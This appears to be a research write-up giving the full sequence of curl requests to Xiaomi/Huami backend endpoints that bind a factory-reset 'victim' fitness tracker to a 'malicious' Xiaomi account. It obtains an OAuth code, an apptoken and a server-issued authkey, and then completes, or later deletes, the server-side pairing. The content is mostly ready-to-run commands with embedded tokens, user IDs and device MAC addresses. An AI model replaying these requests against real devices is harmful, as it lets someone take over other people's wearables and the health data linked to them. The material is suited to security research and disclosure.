# Web Requests for Xiaomi Server-based Pairing v2

This how Xiaomi trackers perform server-based pairing v2 by sending web requests to Xiaomi backend. As a requirement, the victim tracker must not be already registered on Xiaomi backend as paired, thus it is necessary to send a factory reset command to the tracker through Breakmi Android app. The Remote SB App Impersonation can be imitated by manually sending the factory request command, sending the 5 requests explained below, and opening Zepp Life with a malicious account.

## Retrieving the OAUTH2 code

**http://account.xiaomi.com/oauth2/authorize?skip_confirm=false&client_id=428135909242707968&pt=1&scope=1+6000+16001+16002+20000&redirect_uri=https%3A%2F%2Fapi-mifit-cn.huami.com%2Fhuami.health.loginview.do&_locale=en_US&response_type=code&userId=7034468780&nonce=bkGvbHWsdKwBnE7Q&confirmed=true&from_login=true&sign=vi0n5XQ0mQgIvyXvXXilf4HXQV8%3D**

To quickly retrieve his OAUTH2 code, any user can visit the link above. Logging with a malicious Xiaomi account is required. The output webpage will be similar to *https://api-mifit-cn.huami.com/huami.health.loginview.do?code=AZAMSSRV_CA013BAE4F4AEF90F0F1E497C7271DFB*.

## Retrieving the apptoken

**curl -X POST https://account.huami.com/v2/client/login -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -d "dn=account.huami.com%2Capi-user.huami.com%2Cauth.huami.com%2Capi-analytics.huami.com%2Capi-mifit.huami.com%2Capp-analytics.huami.com%2Capi-watch.huami.com&app_version=4.7.0&source=com.xiaomi.hm.health%3A4.7.0%3A50381&country_code=IT&device_id=02%3A00%3A00%3A00%3A00%3A00&third_name=xiaomi-hm-mifit&lang=en&device_model=android_phone&allow_registration=false&app_name=com.xiaomi.hm.health&code=ALSG_CLOUDSRV_8529C90C84A6D2EA154132BF2EF0E3B4&grant_type=request_token&"**

Using the OAUTH2 code as a parameter, a user can retrieve several info; most importantly the apptoken and the userId.

## Preparations for Binding

**curl -X GET https://api-mifit-de2.huami.com/v1/device/binds.json?r=d56c5517-c1c7-4c43-9554-8b29726faefd&t=1621258506420&app_time=1621258506&brandType=-1&productVersion=-1&code=0&activeStatus=-1&productId=-1&bind_timezone=4&device_source=8&device_type=0&crcedUserId=0&userid=7046005119&appid=428135909242707968&auth_key=&brand=samsung&callid=1621258506416&channel=play&country=US&cv=50381_4.7.0&device=android_23&deviceid=&displayName=&enableMultiDevice=true&fw_hr_version=&fw_version=&hardwareVersion=&lang=en_US&mac=FB%3A41%3A81%3A48%3AF2%3AD0&sn=&soft_version=&sys_model=SM-G900F&sys_version=Android_6.0.1&timezone=Europe%2FRome&v=2.0 -H "apptoken: DQVBQFJyQktGHlp6QkpbRl5LRl5qek4uXAQABAAAAAIyLI1YQEF8SxUroYzSuaUdOtev-47tnY4LlzJpTzhNyWR6PgSEU7Y1GCKnGl8GqPmGaODvpxZi-bRm5QhyAUwr9Ll4I2ZxxR7CyJxNt5AC1CsHcjFRzazBbFyMUs4A2RB48vO0pyp6BeNnz203bipnnvzCRqJHTm7lBUYBewIAU"**

Using the apptoken the userId, and the BLE address of the victim tracker as parameters, a user can ask Xiaomi backend to prepare to bind his account to a tracker. This operation is mandatory, even though it doesn't return useful data.

## Retrieving the authkey

**curl -X GET https://api-mifit-de2.huami.com/v1/device/binds.json?r=d56c5517-c1c7-4c43-9554-8b29726faefd&t=1621258514583&device_type=0&userid=7034468780&appid=428135909242707968&callid=1621258514579&channel=play&country=US&cv=50381_4.7.0&device=android_23&lang=en_US&publickeyhash=SHA1%3A1863c2cce5d159413bed92c4b163c279&random=ElmfrrmDGMMxLSS1U7kS8jrnagV16%2BGmqvghTPQAO7I%3D&timezone=Europe%2FRome&v=2.0 -H "apptoken: DQVBQFJyQktGHlp6QkpbRl5LRl5qek4uXAQABAAAAAIyLI1YQEF8SxUroYzSuaUdOtev-47tnY4LlzJpTzhNyWR6PgSEU7Y1GCKnGl8GqPmGaODvpxZi-bRm5QhyAUwr9Ll4I2ZxxR7CyJxNt5AC1CsHcjFRzazBbFyMUs4A2RB48vO0pyp6BeNnz203bipnnvzCRqJHTm7lBUYBewIAU"**

Using the apptoken and the userId as parameters, a user can retrieve a Base64-encoded authkey that must be used during Pairing v2 (sent in chunks to the tracker through the Chunked Transfer characteristic). Two additional inputs are the publickey has, which is communicated by the tracker, but is actually fixed for every device, and the random, which acts as a (deterministic) seed for the authkey generation, and is sent by the tracker so the user can put whatever value he likes.

## Completing Pairing

**curl -X POST https://api-mifit-de2.huami.com/v1/device/binds.json?r=d56c5517-c1c7-4c43-9554-8b29726faefd&t=1621258524458 -H "Content-Type: application/x-www-form-urlencoded" -d "app_time=1621258524&brandType=-1&productVersion=257&code=0&activeStatus=1&productId=61&bind_timezone=4&device_source=59&device_type=0&crcedUserId=0&userid=7046005119&appid=428135909242707968&auth_key=12599faeb98318c3312d24b553b912f2&brand=samsung&callid=1621258524456&channel=play&country=US&cv=50381_4.7.0&device=android_23&deviceid=FB418148F2D0&displayName=&enableMultiDevice=true&fw_hr_version=&fw_version=V1.0.2.24&hardwareVersion=V0.44.18.2&lang=en_US&mac=FB%3A41%3A81%3A48%3AF2%3AD0&sn=ec5326f9ddf3&soft_version=4.7.0&sys_model=SM-G900F&sys_version=Android_6.0.1&timezone=Europe%2FRome&v=2.0" -H "apptoken: DQVBQFJyQktGHlp6QkpbRl5LRl5qek4uXAQABAAAAAIyLI1YQEF8SxUroYzSuaUdOtev-47tnY4LlzJpTzhNyWR6PgSEU7Y1GCKnGl8GqPmGaODvpxZi-bRm5QhyAUwr9Ll4I2ZxxR7CyJxNt5AC1CsHcjFRzazBbFyMUs4A2RB48vO0pyp6BeNnz203bipnnvzCRqJHTm7lBUYBewIAU"**

Using the apptoken, userId, the authkey, the tracker BLE address and the deviceid (same as the address but without punctuation), a user can complete the pairing procedure and link the victim tracker to his Xiaomi account.

## (Extra) Deleting Server-based Pairing

**curl -X DELETE https://api-mifit-de2.huami.com/v1/device/binds.json?r=f13bb1f6-cd98-4c78-9bb8-f66470e07e66&t=1621293645744&app_time=1621293645&brandType=-1&productVersion=-1&code=0&activeStatus=-1&productId=-1&bind_timezone=4&device_source=59&device_type=0&crcedUserId=0&userid=7046005119&appid=428135909242707968&auth_key=&brand=samsung&callid=1621293645743&channel=play&country=US&cv=50381_4.7.0&device=android_23&deviceid=FB418148F2D0&displayName=&enableMultiDevice=true&fw_hr_version=&fw_version=&hardwareVersion=&lang=en_US&mac=FB%3A41%3A81%3A48%3AF2%3AD0&sn=&soft_version=&sys_model=SM-G900F&sys_version=Android_6.0.1&timezone=Europe%2FRome&v=2.0 -H "apptoken: DQVBQFJyQktGHlp6QkpbRl5LRl5qek4uXAQABAAAAAPXZsPCfh3T96p9XxQgefC3TikA0DDGSBp0cBHCjCkOurT4nglCouHItns9TkIloc0_jhp0a-0n-LXdG9cpkRDjtfikzSayw7TxFc82rg3W5qSm4hmmhXz-1rB4gl9mDdXytqZWGVwdmJ6oA62CFHxzakpeH40b2JqItjZidF7XX"**

To remove the bonding between a tracker and a user from Xiaomi servers, the user can run the request above (provided he fills it with the correct data, which he is able to retrieve).
